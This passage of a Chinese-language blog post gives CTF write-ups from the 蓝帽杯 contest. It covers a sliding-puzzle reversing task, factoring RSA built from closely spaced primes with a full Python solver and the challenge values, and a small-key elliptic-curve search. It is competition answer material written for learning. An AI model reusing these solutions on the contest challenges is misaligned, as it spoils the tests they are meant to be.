<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  v10 <span style="color:#f92672">=</span> __ROR4__(__ROL4__(<span style="color:#ae81ff">0x75DFBD5B</span>, <span style="color:#ae81ff">15</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xDEADBEEF</span>, <span style="color:#ae81ff">10</span>);<span style="color:#75715e">// 1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> v10; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">15</span>; i <span style="color:#f92672">=</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">84</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">85</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    sub_400CBA();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( box[i] <span style="color:#f92672">-</span> box[i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>      v10 <span style="color:#f92672">=</span> __ROR4__(__ROL4__(<span style="color:#ae81ff">0x7DDFBD5B</span>, <span style="color:#ae81ff">15</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xDEADBEEF</span>, <span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>内存中总共有16个数字，猜测是一个十六格的拼图</p>
<pre tabindex="0"><code>1, A, 2, 3, 
5, D, 6, 4, 
9,-1, 7, B, 
E, F, C, 8
</code></pre><p>其中-1可以上下左右交换位置</p>
<p>手动解一下，远程验证</p>
<pre tabindex="0"><code>$$##@@%%$##@@%$$#@%%%@#$%@##$%%@##$%@#$#@
</code></pre><h3 id="executable_pyc">executable_pyc</h3>
<p>工具还原字节码，根据字节码手动恢复出python脚本，得到加密逻辑</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">e2</span>(m):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> type(m) <span style="color:#f92672">==</span> bytes
</span></span><span style="display:flex;"><span>    l <span style="color:#f92672">=</span> len(m) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>    m1 <span style="color:#f92672">=</span> s2n(m[:l])
</span></span><span style="display:flex;"><span>    m2 <span style="color:#f92672">=</span> s2n(m[l:])
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> gen_prime(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>    q <span style="color:#f92672">=</span> gen_prime(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>    pp <span style="color:#f92672">=</span> g<span style="color:#f92672">.</span>next_prime(p <span style="color:#f92672">+</span> <span style="color:#ae81ff">2333</span>)
</span></span><span style="display:flex;"><span>    qq <span style="color:#f92672">=</span> g<span style="color:#f92672">.</span>next_prime(q <span style="color:#f92672">+</span> <span style="color:#ae81ff">2333</span>)
</span></span><span style="display:flex;"><span>    e <span style="color:#f92672">=</span> g<span style="color:#f92672">.</span>next_prime(<span style="color:#ae81ff">65535</span>)
</span></span><span style="display:flex;"><span>    ee <span style="color:#f92672">=</span> g<span style="color:#f92672">.</span>next_prime(e)
</span></span><span style="display:flex;"><span>    n <span style="color:#f92672">=</span> p <span style="color:#f92672">*</span> q
</span></span><span style="display:flex;"><span>    nn <span style="color:#f92672">=</span> pp <span style="color:#f92672">*</span> qq
</span></span><span style="display:flex;"><span>    c1 <span style="color:#f92672">=</span> n2s(pow(m1, e, n))
</span></span><span style="display:flex;"><span>    c2 <span style="color:#f92672">=</span> n2s(pow(m2, ee, nn))
</span></span><span style="display:flex;"><span>    print (str(n), nn<span style="color:#f92672">.</span>digits(), (c1 <span style="color:#f92672">+</span> c2)<span style="color:#f92672">.</span>hex())
</span></span></code></pre></div><p>后面就是解密码题了，需要找出p和q</p>
<p>因为素数的频率大概在​ $\ln(n)$ 的时间复杂度，所以​ $pp$ 和 $p$ ​以及 $qq$ ​和 $q$ ​的差距很小，大概在 $​p+2333+\ln(p)$ 附近。</p>
<p>所以让 $pp=p+x, qq=q+y$​。有 $n=pq, nn=pp*qq=(p+x)(q+x)=n+py+qx+xy$</p>
<p>让 $dn=nn-n=py+qx+xy=py+xn/p+xy$​，有 $yp^2+(xy-dn)p+xn=0​$</p>
<p>如果让 $​p$ 有解，则让 $\Delta=(xy-dn)^2-4xyn=x^2y^2-2\cdot dn\cdot xy+(dn)^2-4xyn&gt;0$ ​且能够保证 $\Delta$​开出整数方根。函数如下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">qiugen</span>(x, y, dn):
</span></span><span style="display:flex;"><span>    cur <span style="color:#f92672">=</span> x <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> y <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> dn <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> dn <span style="color:#f92672">*</span> x <span style="color:#f92672">*</span> y <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> x <span style="color:#f92672">*</span> y <span style="color:#f92672">*</span> n
</span></span><span style="display:flex;"><span>    cur_root <span style="color:#f92672">=</span> root(cur, <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> cur_root <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> cur:
</span></span><span style="display:flex;"><span>        up <span style="color:#f92672">=</span> dn <span style="color:#f92672">-</span> x <span style="color:#f92672">*</span> y <span style="color:#f92672">+</span> cur_root
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> up <span style="color:#f92672">%</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> y) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            ans <span style="color:#f92672">=</span> up <span style="color:#f92672">//</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> y)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> ans
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>然后开始遍历​x,y，考虑到素数频率，可以大致确定x,y范围为[2333, 2333+1024]​。将其范围扩展到[2333, 4333]​。这样遍历的范围在4000000次qiugen函数运算。</p>
<p>考虑到​nn确定，所以​x,y之间应该满足某种条件。​</p>
<p>$\Delta=x^2y^2-2dn\cdot xy+(dn)^2-4xyn=h^2-(2dn+4n)h+(dn)^2$，其中$h=xy$​。如果需要让​$\Delta&gt;0$，需要$h&lt;dn+2n-2*sqrt(dn\cdot n+n^2)$，约为6174696​。</p>
<p>所以可以令x遍历[2333,4333]，令y遍历[2333,6174696/x]​，即可找到真正的​x,y。即可得到p,q,pp,qq​。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Qmath <span style="color:#f92672">import</span> root
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> gmpy2 <span style="color:#f92672">import</span> next_prime
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">10300808326934539089496666241808264289631957459372648156286399524715435483257526083909012656240599916663153630994400397551123967736269088895097145175999170121832669199408651009327424481969614347720526807144751032787049942449153321489493089722581323461987069958785112077070200328522919094221696573840593056153329019331663146921270200309620591339456771948171473174493228003768777355758929283942611167959313149646888081882056633536206394514157657102927145569575772516981907153659054180860331268989018643271316833183194539111739812416472551511615664022982639779869597584768094658974144703654232643726744397158318139843</span>
</span></span><span style="display:flex;"><span>nn <span style="color:#f92672">=</span> <span style="color:#ae81ff">10300808326934539089496666241808264289631957459372648156286399524715435483257526083909012656240599916663153630994400397551123967736269088895097145175999170121832669199408651009327424481969614347720526807144751032787049942449153321489493089722581323461987069958785112077070200328522919094221696573840593061197309859493502461339998035893727381543475878482841368750058482267744297318087515308976122481608145274938058888809506400916026737269420025654685431401793700398817215185170304169141953786566489760847593258253794575454082327627379713144072687287826518630644255675609067675836382036436064703619178779628644141463</span>
</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x22cca5150ca0bb2132f68302dc7441e52b91ae7252e44cc13ed83e58253a9aaaa55e095ba36748dff7ea21fff553f8c4656e77a508b64da054f1381b7e2d0600bcec6ed9e1cc8d14c2362aaef7a972a714f88e5afb2d39ed77d0c22a449ca2cfb0802c138f20e0ecbd3c174151cdb8e8ca6d89aa3c503615ebfbc851af5ac51dcfa8b5869b775b57a27b9e4346979180d89b303cae2c5d9e6cabb3c9947837bd8f92333532d4b54dd72ea35400060006328f6f4329147df195ec78a7ab9d39973ce0fd6511e7a0de54737bee64476ba531604f0375b08adf7d768c41ba9e2ba88468d126561a134de79dc0217c1c56d219ca6747103618e46f35281feb9e6050c93e32e26e21ee2c3495f60db2fad9f9a5c570c9f97aee698024ebff6163ef26e32958872db7c593d7f41f90981b8db45aa01085be1e61f7603ecf3d5c032dd90dea791cd9825299548c0cbe7dadabc157048a7fd5cd4bcb1cfeaf0bd2d679f66cb0b1c33ec04bd20317f872c85d500a3475833f983fdee59b3f61a731e2a8b9a60bd7d840f46e97f06dd4fd8ad1cb4d13a82da01938801c33835ceaf34e1cf62ebdde7ac68b17c2a236b64ffacd2a0e7258571ce570871aea9f309df63c0a3abcfa0c05d159a82f9fa3f3ad73944e4ae33c3432c8b65c0d6fe9b560220b14abe5886188fc1e6afa4bb4395669618387224422acf20b519af902225e270</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>dn <span style="color:#f92672">=</span> nn <span style="color:#f92672">-</span> n
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">qiugen</span>(x, y, dn):
</span></span><span style="display:flex;"><span>    cur <span style="color:#f92672">=</span> x <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> y <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> dn <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> dn <span style="color:#f92672">*</span> x <span style="color:#f92672">*</span> y <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> x <span style="color:#f92672">*</span> y <span style="color:#f92672">*</span> n
</span></span><span style="display:flex;"><span>    cur_root <span style="color:#f92672">=</span> root(cur, <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> cur_root <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> cur:
</span></span><span style="display:flex;"><span>        up <span style="color:#f92672">=</span> dn <span style="color:#f92672">-</span> x <span style="color:#f92672">*</span> y <span style="color:#f92672">+</span> cur_root
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> up <span style="color:#f92672">%</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> y) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            ans <span style="color:#f92672">=</span> up <span style="color:#f92672">//</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> y)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> ans
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4333</span>, <span style="color:#ae81ff">2333</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (x <span style="color:#f92672">-</span> <span style="color:#ae81ff">2333</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        print x
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6174700</span> <span style="color:#f92672">//</span> x, <span style="color:#ae81ff">2332</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>        cur_ans <span style="color:#f92672">=</span> qiugen(x, y, dn)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> cur_ans <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            print cur_ans
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> n <span style="color:#f92672">%</span> cur_ans <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                p <span style="color:#f92672">=</span> cur_ans
</span></span><span style="display:flex;"><span>                q <span style="color:#f92672">=</span> n <span style="color:#f92672">//</span> p
</span></span><span style="display:flex;"><span>                print cur_ans
</span></span><span style="display:flex;"><span>pp <span style="color:#f92672">=</span> next_prime(p <span style="color:#f92672">+</span> <span style="color:#ae81ff">2333</span>)
</span></span><span style="display:flex;"><span>qq <span style="color:#f92672">=</span> next_prime(q <span style="color:#f92672">+</span> <span style="color:#ae81ff">2333</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print (n2s(pow(c1, invmod(<span style="color:#ae81ff">0x10001</span>, (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)), p <span style="color:#f92672">*</span> q)))
</span></span><span style="display:flex;"><span>print (n2s(pow(c2, invmod(<span style="color:#ae81ff">0x10003</span>, (pp <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (qq <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)), pp <span style="color:#f92672">*</span> qq)))
</span></span></code></pre></div><h2 id="crypto">Crypto</h2>
<h3 id="crack-point">crack point</h3>
<p>已知椭圆曲线正常加密，key的位数过小，大步小步法爆破2的39次方到2的40次方寻找key=436370150383，算出</p>
<p>point2 = (54874480268135442592960451774606422130 : 54593336491331150503709607435043296744 : 1)</p>
<p>flag = cipher - point_2得到最终点</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/writeup/">Writeup</a>
        
            <a href="/tags/%E8%93%9D%E5%B8%BD%E6%9D%AF/">蓝帽杯</a>
        
            <a href="/tags/misc/">Misc</a>
        
            <a href="/tags/re/">Re</a>
        
            <a href="/tags/pwn/">Pwn</a>
        
            <a href="/tags/crypto/">Crypto</a>
        
    </section>


    </footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
                defer="true"
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.querySelector(`.article-content`), {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ]
        });})
</script>
    
</article>

    <aside class="related-contents--wrapper">
    
    
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2022 or4nge
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

            </main>
    
        <aside class="sidebar right-sidebar sticky">
            <section class="widget archives">
                <div class="widget-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                </div>
                <h2 class="widget-title section-title">Table of contents</h2>
                
                <div class="widget--toc">
                    <nav id="TableOfContents">
  <ul>
    <li><a href="#misc">Misc</a>
      <ul>
        <li><a href="#溯源取证张三的电脑">溯源取证——张三的电脑</a></li>
      </ul>
    </li>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#secretcode">secretcode</a></li>
        <li><a href="#babynote">babynote</a></li>
      </ul>
    </li>
    <li><a href="#re">Re</a>
      <ul>
        <li><a href="#abc">abc</a></li>
        <li><a href="#executable_pyc">executable_pyc</a></li>
      </ul>
    </li>
    <li><a href="#crypto">Crypto</a>
      <ul>
        <li><a href="#crack-point">crack point</a></li>
      </ul>
    </li>
  </ul>
</nav>
                </div>
            </section>
        </aside>
    

        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
